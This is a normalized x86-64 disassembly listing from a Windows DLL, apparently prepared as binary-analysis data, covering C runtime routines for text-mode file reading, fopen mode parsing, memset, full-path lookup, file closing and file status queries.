mov [ rsp + 0x20 ] rdi
call [ ReadFile@IAT ]
cmp eax edi
je r-xdata
mov cl [ rax + rsi + 0x9 ]
cmp cl r8b
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x5
jne r-xdata
movsxd rdx [ rsp + 0x30 ]
cmp edx edi
jl r-xdata
cmp ebx edi
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_1800075a8
mov [ rax ] 0x9
call sub_1800075c8
mov [ rax ] 0x5
jmp r-xdata
mov eax ebx
cmp rdx rax
ja r-xdata
mov [ r13 ] cl
mov rax [ r9 + r14 * 8 + 0x1f4e0 ]
or r10d 0xffffffff
add ebx r10d
lea rdx [ r13 + 0x1 ]
lea ebp [ r8 - 0x9 ]
mov [ rax + rsi + 0x9 ] r8b
cmp r15b dil
je r-xdata
mov ecx eax
call sub_1800075e8
jmp r-xdata
mov r12d edi
jmp r-xdata
or r12d 0xffffffff
jmp r-xdata
lea r8 [ __dos_header ]
add ebp edx
mov rax [ r8 + r14 * 8 + 0x1f4e0 ]
test [ rax + rsi + 0x8 ] 0x80
je r-xdata
mov rax [ r9 + r14 * 8 + 0x1f4e0 ]
mov cl [ rax + rsi + 0x39 ]
cmp cl r8b
je r-xdata
mov r15 [ rsp + 0xa8 ]
cmp r15b 0x2
je r-xdata
cmp ebx edi
je r-xdata
cmp r12d 0xfffffffe
cmove r12d ebp
mov eax r12d
jmp r-xdata
mov rcx r13
call sub_180004690
cmp edx edi
mov edx 0xa
je r-xdata
cmp edx edi
je r-xdata
mov [ rdx ] cl
mov rax [ r9 + r14 * 8 + 0x1f4e0 ]
add ebx r10d
inc rdx
lea ebp [ r8 - 0x8 ]
mov [ rax + rsi + 0x39 ] r8b
cmp r15b 0x1
jne r-xdata
and [ rax + rsi + 0x8 ] 0xfb
cmp [ r13 ] dx
jne r-xdata
and [ rax + rsi + 0x8 ] 0xfb
cmp [ r13 ] 0xa
jne r-xdata
mov rax [ r9 + r14 * 8 + 0x1f4e0 ]
mov cl [ rax + rsi + 0x3a ]
cmp cl r8b
je r-xdata
mov ebp ebx
sub ebp r13d
mov ebp 0xd
or [ rax + rsi + 0x8 ] 0x4
jmp r-xdata
mov ebp ebx
sub ebp r13d
cmp r15b 0x1
jne r-xdata
mov ebp 0xd
or [ rax + rsi + 0x8 ] 0x4
jmp r-xdata
cmp ebx edi
je r-xdata
mov rax [ r8 + r14 * 8 + 0x1f4e0 ]
test [ rax + rsi + 0x8 ] 0x40
jne r-xdata
cmp ax bp
je r-xdata
movsxd rax ebp
mov rbx r13
mov r12 r13
lea r15 [ rax + r13 ]
cmp r13 r15
jae r-xdata
mov r12d [ rsp + 0x34 ]
cmp ebp edi
je r-xdata
mov rax [ r8 + r14 * 8 + 0x1f4e0 ]
test [ rax + rsi + 0x8 ] 0x40
jne r-xdata
cmp al bpl
je r-xdata
movsxd rax ebp
mov rbx r13
mov r12 r13
add rax r13
mov [ rsp + 0x40 ] rax
cmp r13 rax
jae r-xdata
mov [ rdx ] cl
mov rax [ r9 + r14 * 8 + 0x1f4e0 ]
inc rdx
lea ebp [ r8 - 0x7 ]
add ebx r10d
mov [ rax + rsi + 0x3a ] r8b
movzx eax [ r12 ]
mov [ rbx ] ax
add rbx 0x2
or [ rax + rsi + 0x8 ] 0x2
jmp r-xdata
lea rax [ r15 - 0x2 ]
cmp r12 rax
jae r-xdata
mov [ rbx ] ax
add rbx 0x2
add r12 0x2
jmp r-xdata
mov r15d 0x1
sub rbx r15
test [ rbx ] 0x80
jne r-xdata
mov al [ r12 ]
mov [ rbx ] al
inc rbx
or [ rax + rsi + 0x8 ] 0x2
jmp r-xdata
mov rax [ rsp + 0x40 ]
dec rax
cmp r12 rax
jae r-xdata
mov [ rbx ] al
inc rbx
inc r12
jmp r-xdata
mov rcx [ r8 + r14 * 8 + 0x1f4e0 ]
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0xb8 ]
mov rcx [ rcx + rsi ]
mov r8d 0x2
add r12 0x2
mov [ rsp + 0x20 ] rdi
call [ ReadFile@IAT ]
cmp eax edi
jne r-xdata
lea rax [ r12 + 0x2 ]
cmp [ rax ] dx
jne r-xdata
cmp r12 r15
jb r-xdata
mov edx r15d
jmp r-xdata
add rbx r15
jmp r-xdata
mov rcx [ r8 + r14 * 8 + 0x1f4e0 ]
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0xb0 ]
mov rcx [ rcx + rsi ]
mov r8d 0x1
inc r12
mov [ rsp + 0x20 ] rdi
call [ ReadFile@IAT ]
cmp eax edi
jne r-xdata
lea rax [ r12 + 0x1 ]
cmp [ rax ] 0xa
jne r-xdata
cmp r12 [ rsp + 0x40 ]
jb r-xdata
cmp [ rsp + 0x30 ] edi
je r-xdata
call [ GetLastError@IAT ]
cmp eax edi
jne r-xdata
mov r12 rax
jmp r-xdata
add r12 0x4
jmp r-xdata
movzx eax [ r12 ]
cmp ax 0x1a
je r-xdata
jmp r-xdata
movzx eax [ rbx ]
cmp [ rax + r8 + 0x1c770 ] dil
je r-xdata
mov eax [ rsp + 0x38 ]
mov r15 [ rsp + 0xa8 ]
sub ebx r13d
shr eax 0x1
mov r9d ebx
mov r8 r13
mov [ rsp + 0x28 ] eax
xor edx edx
mov ecx 0xfde9
mov [ rsp + 0x20 ] r15
call [ MultiByteToWideChar@IAT ]
mov ebp eax
cmp eax edi
jne r-xdata
cmp [ rsp + 0x30 ] edi
je r-xdata
call [ GetLastError@IAT ]
cmp eax edi
jne r-xdata
mov r12 rax
jmp r-xdata
add r12 0x2
jmp r-xdata
mov al [ r12 ]
cmp al 0x1a
je r-xdata
jmp r-xdata
mov edx 0xa
lea r8 [ __dos_header ]
lea r8 [ __dos_header ]
mov rax [ r8 + r14 * 8 + 0x1f4e0 ]
test [ rax + rsi + 0x8 ] 0x48
je r-xdata
mov [ rbx ] bp
mov [ rbx ] dx
jmp r-xdata
cmp edx 0x4
jg r-xdata
movzx ecx [ rbx ]
movsx eax [ rcx + r8 + 0x1c770 ]
cmp eax edi
jne r-xdata
mov r12d [ rsp + 0x34 ]
cmp eax ebx
lea rax [ __dos_header ]
mov rax [ rax + r14 * 8 + 0x1f4e0 ]
setne dil
add ebp ebp
mov [ rax + rsi + 0x48 ] edi
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx eax
call sub_1800075e8
or r12d 0xffffffff
jmp r-xdata
lea r8 [ __dos_header ]
lea r8 [ __dos_header ]
mov rax [ r8 + r14 * 8 + 0x1f4e0 ]
test [ rax + rsi + 0x8 ] 0x48
je r-xdata
mov [ rbx ] bpl
mov [ rbx ] 0xa
jmp r-xdata
cmp rbx r13
jne r-xdata
mov edx 0xa
cmp [ rsp + 0xb8 ] dx
je r-xdata
add rbx 0x2
cmp rbx r13
jb r-xdata
inc eax
cmp eax edx
jne r-xdata
call sub_1800075a8
mov [ rax ] 0x2a
cmp r13 r15
je r-xdata
cmp rbx r13
jne r-xdata
cmp [ rsp + 0xb0 ] 0xa
je r-xdata
inc rbx
mov ecx [ rsp + 0xa0 ]
mov rdx 0xfffffffffffffffe
lea r8d [ rdx + 0x3 ]
call sub_18000f6ec
mov edx 0xa
lea r8 [ __dos_header ]
cmp [ rsp + 0xb8 ] dx
je r-xdata
mov edx 0xa
cmp [ rsp + 0xb8 ] dx
jne r-xdata
mov [ rbx ] bp
mov al [ rsp + 0xb8 ]
mov rcx [ r8 + r14 * 8 + 0x1f4e0 ]
mov [ rcx + rsi + 0x9 ] al
mov al [ rsp + 0xb9 ]
mov rcx [ r8 + r14 * 8 + 0x1f4e0 ]
mov [ rcx + rsi + 0x39 ] al
mov rax [ r8 + r14 * 8 + 0x1f4e0 ]
mov [ rax + rsi + 0x3a ] dl
jmp r-xdata
sub rbx r15
add edx r15d
mov rax [ r8 + r14 * 8 + 0x1f4e0 ]
test [ rax + rsi + 0x8 ] 0x48
je r-xdata
movsxd rax edx
add rbx rax
jmp r-xdata
mov ecx [ rsp + 0xa0 ]
mov r8d 0x1
or rdx 0xffffffffffffffff
call sub_18000f6ec
cmp [ rsp + 0xb0 ] 0xa
lea r8 [ __dos_header ]
je r-xdata
cmp [ rsp + 0xb0 ] 0xa
jne r-xdata
mov [ rbx ] bpl
mov rcx [ r8 + r14 * 8 + 0x1f4e0 ]
mov al [ rsp + 0xb0 ]
mov [ rcx + rsi + 0x9 ] al
jmp r-xdata
jmp r-xdata
mov ecx [ rsp + 0xa0 ]
neg edx
mov r8d r15d
movsxd rdx edx
call sub_18000f6ec
add rbx r15
cmp edx 0x2
mov [ rax + rsi + 0x9 ] cl
jl r-xdata
jmp r-xdata
cmp edx 0x3
jne r-xdata
mov al [ rbx ]
mov rcx [ r8 + r14 * 8 + 0x1f4e0 ]
add rbx r15
mov [ rcx + rsi + 0x39 ] al
movsxd rax edx
sub rbx rax
jmp r-xdata
mov al [ rbx ]
mov rcx [ r8 + r14 * 8 + 0x1f4e0 ]
add rbx r15
mov [ rcx + rsi + 0x3a ] al
sub_1800092e0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x8 ] ecx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov esi r8d
mov r13 rdx
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
xor ebx ebx
cmp edi ebx
jl r-xdata
call sub_1800075c8
xor ebx ebx
mov [ rax ] ebx
call sub_1800075a8
mov [ rax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_1800075c8
mov [ rax ] ebx
call sub_1800075a8
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
or eax 0xffffffff
cmp edi [ rw-data ]
jae r-xdata
mov rbx [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov r12 rdi
mov r14 rdi
sar r14 0x5
lea r15 [ rw-data ]
and r12d 0x1f
imul r12 r12 0x58
mov rax [ r15 + r14 * 8 ]
movsx ecx [ rax + r12 + 0x8 ]
and ecx 0x1
jne r-xdata
mov eax ebx
cmp r8d 0x7fffffff
setbe al
cmp eax ebx
jne r-xdata
call sub_1800075c8
mov [ rax ] ebx
call sub_1800075a8
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
or eax 0xffffffff
jmp r-xdata
mov ecx edi
call sub_18000fed0
nop
mov rax [ r15 + r14 * 8 ]
test [ rax + r12 + 0x8 ] 0x1
je r-xdata
call sub_1800075c8
mov [ rax ] ebx
call sub_1800075a8
mov [ rax ] 0x16
mov [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
or eax 0xffffffff
jmp r-xdata
call sub_1800075a8
mov [ rax ] 0x9
call sub_1800075c8
mov [ rax ] ebx
or ebx 0xffffffff
mov r8d esi
mov rdx r13
mov ecx edi
call sub_180008b60
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_18000ff78
mov eax ebx
jmp r-xdata
sub_180009454
sub rsp 0x38
test rcx rcx
jne r-xdata
mov eax [ rcx + 0x1c ]
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
or eax 0xffffffff
jmp r-xdata
add rsp 0x38
retn
sub_18000948c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
mov rbx r9
mov rsi r8
mov rdi rdx
test r9 r9
jne r-xdata
test rcx rcx
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
je r-xdata
call sub_1800075a8
mov ebx 0x16
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov r8 rdx
xor edx edx
call sub_180009540
test rsi rsi
je r-xdata
cmp rdx rbx
jb r-xdata
cmp rdi rbx
jae r-xdata
mov r8 rbx
mov rdx rsi
call sub_1800059c0
jmp r-xdata
mov eax 0x16
call sub_1800075a8
mov ebx 0x22
jmp r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
call sub_180008530
mov eax ebx
jmp r-xdata
sub_180009540
mov rax rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
movzx edx dl
mov r9 0x101010101010101
imul rdx r9
cmp r8 0x40
jb r-xdata
retn
mov [ rcx ] dl
inc rcx
dec r8
jne r-xdata
mov r9 r8
and r8 0x7
shr r9 0x3
je r-xdata
neg rcx
and ecx 0x7
je r-xdata
nop
nop
add rcx rax
mov r9 r8
and r8 0x3f
shr r9 0x6
jne r-xdata
sub r8 rcx
mov [ rax ] rdx
mov [ rcx ] rdx
add rcx 0x8
dec r9
jne r-xdata
cmp r9 0x1c00
jae r-xdata
movnti [ rcx ] rdx
movnti [ rcx + 0x8 ] rdx
movnti [ rcx + 0x10 ] rdx
add rcx 0x40
movnti [ rcx - 0x28 ] rdx
movnti [ rcx - 0x20 ] rdx
dec r9
movnti [ rcx - 0x18 ] rdx
movnti [ rcx - 0x10 ] rdx
movnti [ rcx - 0x8 ] rdx
jne r-xdata
mov [ rcx ] rdx
mov [ rcx + 0x8 ] rdx
mov [ rcx + 0x10 ] rdx
add rcx 0x40
mov [ rcx - 0x28 ] rdx
mov [ rcx - 0x20 ] rdx
dec r9
mov [ rcx - 0x18 ] rdx
mov [ rcx - 0x10 ] rdx
mov [ rcx - 0x8 ] rdx
jne r-xdata
[ rsp ] 0x0
jmp r-xdata
jmp r-xdata
sub_18000962c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov ebp [ rw-data ]
xor r14d r14d
mov rsi r9
lea r15d [ r14 + 0x20 ]
mov r12d r8d
mov rbx rdx
mov r13 rcx
mov r9d r14d
mov r10d r14d
mov r11d r14d
cmp [ rdx ] r15w
jne r-xdata
movzx eax [ rbx ]
mov r8d 0x1
cmp eax 0x61
je r-xdata
add rbx 0x2
cmp [ rbx ] r15w
je r-xdata
mov edi 0x109
cmp eax 0x72
je r-xdata
cmp [ rbx ] r15w
je r-xdata
cmp edx r14d
je r-xdata
mov edi r14d
or ebp r8d
jmp r-xdata
cmp eax 0x77
je r-xdata
add rbx 0x2
cmp [ rbx ] r14w
jne r-xdata
cmp r11d r14d
je r-xdata
movzx ecx ax
cmp ecx 0x53
jg r-xdata
add rbx 0x2
mov edx r8d
movzx eax [ rbx ]
cmp ax r14w
je r-xdata
mov edi 0x301
jmp r-xdata
call sub_1800075a8
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r14
mov [ rax ] 0x16
call sub_180008530
lea rcx [ rsp + 0x68 ]
mov r9d r12d
mov r8d edi
mov rdx r13
mov [ rsp + 0x20 ] 0x180
call sub_18000ab54
cmp eax r14d
jne r-xdata
jmp r-xdata
sub ecx 0x54
je r-xdata
je r-xdata
or ebp 0x2
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
xor eax eax
jmp r-xdata
inc [ rw-data ]
mov eax [ rsp + 0x68 ]
mov [ rsi + 0x18 ] ebp
mov [ rsi + 0x1c ] eax
mov [ rsi + 0x8 ] r14d
mov [ rsi ] r14
mov rax rsi
mov [ rsi + 0x10 ] r14
mov [ rsi + 0x28 ] r14
cmp [ rbx ] r15w
je r-xdata
bt edi 0xc
jae r-xdata
sub ecx 0xe
je r-xdata
cmp r10d r14d
jne r-xdata
sub ecx r15d
je r-xdata
add rbx 0x2
lea rcx [ r--data ]
mov r8d 0x3
mov rdx rbx
call sub_1800101bc
cmp eax r14d
jne r-xdata
bts edi 0xc
mov edx r14d
jmp r-xdata
test edi 0xc000
jne r-xdata
sub ecx r8d
je r-xdata
mov r10d r8d
or edi r15d
jmp r-xdata
add rbx 0x2
mov ax [ rbx ]
cmp ax r14w
jne r-xdata
sub ecx 0xb
je r-xdata
add rbx 0x6
jmp r-xdata
bts edi 0xf
jmp r-xdata
cmp r9d r14d
jne r-xdata
sub ecx 0xb
je r-xdata
test dil 0x2
jne r-xdata
sub ecx r8d
je r-xdata
cmp [ rbx ] r15w
je r-xdata
mov r9d r8d
bts ebp 0xe
jmp r-xdata
cmp r9d r14d
jne r-xdata
cmp ecx 0x6
jne r-xdata
and edi 0xfffffffe
and ebp 0xfffffffc
or edi 0x2
bts ebp 0x7
jmp r-xdata
mov r11d r8d
jmp r-xdata
sub ecx 0x18
je r-xdata
add rbx 0x2
cmp [ rbx ] 0x3d
jne r-xdata
mov r9d r8d
btr ebp 0xe
jmp r-xdata
test edi 0xc000
jne r-xdata
test dil 0x40
jne r-xdata
sub ecx 0xa
je r-xdata
add rbx 0x2
cmp [ rbx ] r15w
je r-xdata
bts edi 0xe
jmp r-xdata
or edi 0x40
jmp r-xdata
bts edi 0x7
jmp r-xdata
cmp ecx 0x4
jne r-xdata
lea rdx [ r--data ]
mov r8d 0x5
mov rcx rbx
call sub_180005e20
cmp eax r14d
jne r-xdata
cmp r10d r14d
jne r-xdata
lea rdx [ r--data ]
mov r8d 0x8
mov rcx rbx
call sub_180005e20
cmp eax r14d
jne r-xdata
add rbx 0xa
bts edi 0x12
jmp r-xdata
mov r10d r8d
or edi 0x10
jmp r-xdata
lea rdx [ r--data ]
mov r8d 0x7
mov rcx rbx
call sub_180005e20
cmp eax r14d
jne r-xdata
add rbx 0x10
bts edi 0x11
jmp r-xdata
add rbx 0xe
bts edi 0x10
jmp r-xdata
sub_180009944
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x30
xor r12d r12d
mov rsi r8
mov rbp rdx
mov rdi rcx
cmp rdx r12
je r-xdata
mov edx r8d
call sub_180010364
cmp [ rdx ] r12w
je r-xdata
cmp rcx r12
jne r-xdata
cmp r8 r12
ja r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
mov rcx rbp
call [ GetFullPathNameW@IAT ]
cmp eax r12d
jne r-xdata
mov rbx rcx
call sub_1800075a8
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r12
mov [ rax ] 0x16
call sub_180008530
jmp r-xdata
mov eax eax
cmp rsi rax
cmova rax rsi
mov rsi rax
mov rax 0x7fffffffffffffff
cmp rsi rax
jbe r-xdata
call [ GetLastError@IAT ]
mov ecx eax
call sub_1800075e8
cmp eax r12d
jne r-xdata
cmp rdi r12
jne r-xdata
xor eax eax
jmp r-xdata
mov edx 0x2
mov rcx rsi
call sub_1800103a8
mov rbx rax
cmp rax r12
jne r-xdata
call sub_1800075a8
mov [ rax ] 0x16
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x60 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov rax rbx
jmp r-xdata
cmp rdi r12
jne r-xdata
call sub_1800075a8
mov [ rax ] 0x22
jmp r-xdata
mov rcx rbx
call sub_180004690
lea r9 [ rsp + 0x58 ]
mov r8 rbx
mov edx esi
mov rcx rbp
call [ GetFullPathNameW@IAT ]
mov ecx eax
cmp rcx rsi
jb r-xdata
call sub_1800075a8
mov [ rax ] 0xc
jmp r-xdata
mov rcx rbx
call sub_180004690
jmp r-xdata
sub_180009a8c
push rbx
sub rsp 0x20
mov r11d [ r8 ]
mov rbx rdx
mov r9 rcx
and r11d 0xfffffff8
test [ r8 ] 0x4
mov r10 rcx
je r-xdata
movsxd rax r11d
mov rdx [ rax + r10 ]
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0x8 ]
add rcx [ rbx + 0x8 ]
test [ rcx + 0x3 ] 0xf
je r-xdata
mov eax [ r8 + 0x8 ]
movsxd r10 [ r8 + 0x4 ]
neg eax
add r10 rcx
movsxd rcx eax
and r10 rcx
xor r9 rdx
mov rcx r9
add rsp 0x20
pop rbx
jmp sub_1800042d0
movzx eax [ rcx + 0x3 ]
and eax 0xfffffff0
cdqe
add r9 rax
sub_180009b10
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov r8 rdx
movzx edx cl
cmp [ r8 + 0x2 ] 0x3a
mov rax r8
jne r-xdata
xor esi esi
cmp [ rax ] 0x5c
je r-xdata
lea rax [ r8 + 0x4 ]
cmp [ rax + 0x2 ] si
je r-xdata
cmp [ rax ] 0x2f
jne r-xdata
mov ebx 0x4040
test dl 0x10
jne r-xdata
mov rsi [ rsp + 0x38 ]
movzx eax bx
shr ax 0x3
and ax 0x38
or bx ax
movzx eax bx
shr ax 0x6
and ax 0x7
or ax bx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rdx [ r--data ]
mov rcx rax
call sub_180005fdc
cmp eax esi
je r-xdata
mov ebx 0x8000
cmp [ rax ] si
jne r-xdata
or bx 0x40
lea rdx [ r--data ]
mov rcx rdi
call sub_180005fdc
cmp eax esi
je r-xdata
shl dx 0x7
mov eax 0x80
mov rcx r8
not dx
and dx ax
mov eax 0x100
or dx ax
or bx dx
mov edx 0x2e
call sub_1800103ec
mov rdi rax
cmp rax rsi
je r-xdata
lea rdx [ r--data ]
mov rcx rdi
call sub_180005fdc
cmp eax esi
je r-xdata
lea rdx [ r--data ]
mov rcx rdi
call sub_180005fdc
cmp eax esi
jne r-xdata
sub_180009c08
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rdi ecx
mov ecx edi
call sub_18000fe4c
cmp rax 0xffffffffffffffff
je r-xdata
xor ebx ebx
mov rax [ rw-data ]
mov ecx 0x2
cmp edi 0x1
jne r-xdata
xor eax eax
mov ecx ebx
call sub_1800075e8
or eax 0xffffffff
jmp r-xdata
cmp edi ecx
jne r-xdata
test [ rax + 0xb8 ] dil
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx edi
call sub_18000fe4c
mov rcx rax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ rax + 0x60 ] 0x1
je r-xdata
call sub_18000fe4c
mov ecx 0x1
mov rbx rax
call sub_18000fe4c
cmp rax rbx
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_18000fda0
mov r11 rdi
mov rcx rdi
sar rcx 0x5
and r11d 0x1f
lea rdx [ rw-data ]
mov rcx [ rdx + rcx * 8 ]
imul r11 r11 0x58
mov [ rcx + r11 + 0x8 ] 0x0
test ebx ebx
je r-xdata
sub_180009cc4
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
mov [ rsp + 0x8 ] ecx
push rdi
push r12
push r13
sub rsp 0x30
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
xor edi edi
cmp ebx edi
jl r-xdata
call sub_1800075c8
xor edi edi
mov [ rax ] edi
call sub_1800075a8
mov [ rax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_1800075c8
mov [ rax ] edi
call sub_1800075a8
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
or eax 0xffffffff
cmp ebx [ rw-data ]
jae r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x30
pop r13
pop r12
pop rdi
retn
mov rsi rbx
mov r12 rbx
sar r12 0x5
lea r13 [ rw-data ]
and esi 0x1f
imul rsi rsi 0x58
mov rax [ r13 + r12 * 8 ]
movsx ecx [ rax + rsi + 0x8 ]
and ecx 0x1
jne r-xdata
mov ecx ebx
call sub_18000fed0
nop
mov rax [ r13 + r12 * 8 ]
test [ rax + rsi + 0x8 ] 0x1
je r-xdata
call sub_1800075c8
mov [ rax ] edi
call sub_1800075a8
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
or eax 0xffffffff
jmp r-xdata
call sub_1800075a8
mov [ rax ] 0x9
or edi 0xffffffff
mov ecx ebx
call sub_180009c08
mov edi eax
jmp r-xdata
mov ecx ebx
call sub_18000ff78
mov eax edi
jmp r-xdata
sub_180009ddc
mov [ rsp + 0x8 ] ecx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x90
mov rdi rdx
movsxd rsi ecx
xor ebx ebx
mov eax ebx
cmp rdx rbx
setne al
cmp eax ebx
jne r-xdata
xor edx edx
lea r8d [ rdx + 0x30 ]
mov rcx rdi
call sub_180009540
cmp esi 0xfffffffe
jne r-xdata
call sub_1800075c8
mov [ rax ] ebx
call sub_1800075a8
mov [ rax ] 0x16
mov [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
or eax 0xffffffff
jmp r-xdata
cmp esi ebx
jl r-xdata
call sub_1800075c8
mov [ rax ] ebx
call sub_1800075a8
mov [ rax ] 0x9
or eax 0xffffffff
jmp r-xdata
add rsp 0x90
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
call sub_1800075c8
mov [ rax ] ebx
call sub_1800075a8
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
or eax 0xffffffff
cmp esi [ rw-data ]
jae r-xdata
mov r12 rsi
mov r13 rsi
sar r13 0x5
lea r15 [ rw-data ]
and r12d 0x1f
imul r12 r12 0x58
mov rax [ r15 + r13 * 8 ]
movsx ecx [ rax + r12 + 0x8 ]
mov r14d 0x1
and ecx r14d
jne r-xdata
mov ecx esi
call sub_18000fed0
nop
mov rcx [ r15 + r13 * 8 ]
test [ rcx + r12 + 0x8 ] r14b
jne r-xdata
call sub_1800075c8
mov [ rax ] ebx
call sub_1800075a8
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
or eax 0xffffffff
jmp r-xdata
mov rcx [ rcx + r12 ]
call [ GetFileType@IAT ]
btr eax 0xf
cmp eax r14d
je r-xdata
call sub_1800075a8
mov [ rax ] 0x9
or ebx 0xffffffff
jmp r-xdata
mov [ rdi + 0x6 ] bx
mov [ rdi + 0xc ] bx
mov [ rdi + 0xa ] bx
mov [ rdi + 0x4 ] bx
mov [ rdi + 0x8 ] r14w
mov rcx [ r15 + r13 * 8 ]
lea rdx [ rsp + 0x50 ]
mov rcx [ rcx + r12 ]
call [ GetFileInformationByHandle@IAT ]
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
mov ecx esi
call sub_18000ff78
mov eax ebx
jmp r-xdata
test [ rsp + 0x50 ] r14b
je r-xdata
call [ GetLastError@IAT ]
mov ecx eax
call sub_1800075e8
or ebx 0xffffffff
jmp r-xdata
cmp eax 0x2
jne r-xdata
cmp eax 0x3
je r-xdata
movzx eax [ rdi + 0x6 ]
or eax 0x1b6
mov [ rdi + 0x6 ] ax
movzx eax [ rdi + 0x6 ]
or eax 0x124
mov [ rdi + 0x6 ] ax
jmp r-xdata
mov ecx 0x1000
mov [ rdi + 0x6 ] cx
mov ecx 0x2000
mov [ rdi + 0x6 ] cx
jmp r-xdata
cmp eax ebx
jne r-xdata
lea rdx [ rsp + 0xe0 ]
lea rcx [ rsp + 0x64 ]
call [ FileTimeToLocalFileTime@IAT ]
cmp eax ebx
je r-xdata
cmp [ rsp + 0x68 ] ebx
jne r-xdata
cmp [ rsp + 0x64 ] ebx
jne r-xdata
mov rcx [ r15 + r13 * 8 ]
mov [ rsp + 0x28 ] rbx
lea rax [ rsp + 0xd8 ]
mov [ rsp + 0x20 ] rax
xor r9d r9d
xor r8d r8d
xor edx edx
mov rcx [ rcx + r12 ]
call [ PeekNamedPipe@IAT ]
neg eax
sbb ecx ecx
and ecx [ rsp + 0xd8 ]
mov [ rdi + 0x14 ] ecx
jmp r-xdata
mov [ rdi + 0x14 ] ebx
jmp r-xdata
mov [ rdi ] esi
mov [ rdi + 0x10 ] esi
mov [ rdi + 0x8 ] r14w
mov [ rdi + 0x4 ] bx
mov [ rdi + 0xc ] bx
mov [ rdi + 0xa ] bx
mov [ rdi + 0x28 ] rbx
mov [ rdi + 0x20 ] rbx
mov [ rdi + 0x18 ] rbx
cmp eax 0x2
jne r-xdata
call [ GetLastError@IAT ]
mov ecx eax
call sub_1800075e8
or ebx 0xffffffff
jmp r-xdata
call sub_1800075a8
mov [ rax ] 0x9
or ebx 0xffffffff
jmp r-xdata
or ebx 0xffffffff
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0xe0 ]
call [ FileTimeToSystemTime@IAT ]
cmp eax ebx
je r-xdata
mov [ rdi + 0x20 ] rbx
jmp r-xdata
movzx eax [ rsp + 0x4c ]
movzx r10d [ rsp + 0x4a ]
movzx r9d [ rsp + 0x48 ]
movzx r8d [ rsp + 0x46 ]
movzx edx [ rsp + 0x42 ]
movzx ecx [ rsp + 0x40 ]
or [ rsp + 0x30 ] 0xffffffff
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r10d
call sub_18000ab88
mov [ rdi + 0x20 ] rax
cmp [ rsp + 0x5c ] ebx
jne r-xdata
lea rdx [ rsp + 0xe0 ]
lea rcx [ rsp + 0x5c ]
